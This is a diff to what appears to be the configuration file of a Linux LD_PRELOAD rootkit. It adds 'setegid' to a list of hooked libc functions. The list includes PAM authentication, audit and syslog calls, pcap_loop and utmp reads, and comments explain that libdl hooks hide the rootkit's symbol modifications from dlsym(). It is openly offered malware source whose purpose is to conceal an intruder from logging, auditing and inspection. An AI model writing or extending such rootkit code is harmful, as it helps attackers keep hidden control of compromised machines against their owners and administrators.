@@ -56,7 +56,7 @@ PROC_NET_TCP6 = "/proc/net/tcp6"
 SSL_CIPHER_LIST = "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH"
 
 # each line has the names of 4 edited library function names..multiply this by the amount of lines and add on any stragglers
-# amount of library functions being hooked = (4 * 22) + 2 = 90
+# amount of library functions being hooked = (4 * 22) + 3 = 91
 CALLS = ["rename", "renameat", "renameat2", "fread",
          "stat", "stat64", "fstat", "fstat64",
          "lstat", "lstat64", "__lxstat", "__lxstat64",
@@ -80,7 +80,7 @@ CALLS = ["rename", "renameat", "renameat2", "fread",
          "audit_log_user_message", "audit_send", "getutent", "getutxent",
          "pututline", "pcap_loop", "getpwent", "syslog",
          "__syslog_chk", "dladdr", "dlinfo", "dlsym",
-         "socket", "login"]
+         "socket", "login", "setegid"]
 
 # the following three lists are just used to hide from dlsym()
 # read symbols/hiding/libdl/dlsym.c for hiding functionality in relation to dlsym()
@@ -105,7 +105,8 @@ LIBC_CALLS = ["rename", "renameat", "renameat2", "fread",
              "lgetxattr", "fgetxattr", "setxattr", "lsetxattr",
              "fsetxattr", "removexattr", "lremovexattr", "fremovexattr",
              "getutent", "getutxent", "pututline", "getpwent",
-             "syslog", "__syslog_chk", "socket", "login"] # return original address for all of these libc functions
+             "syslog", "__syslog_chk", "socket", "login",
+             "setegid"] # return original address for all of these libc functions
 LIBDL_CALLS = ["dladdr", "dlinfo", "dlsym"] # we also hook libdl stuff in order to hide modifications to library symbols, so we need to do the same here
 LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and the same here...
 
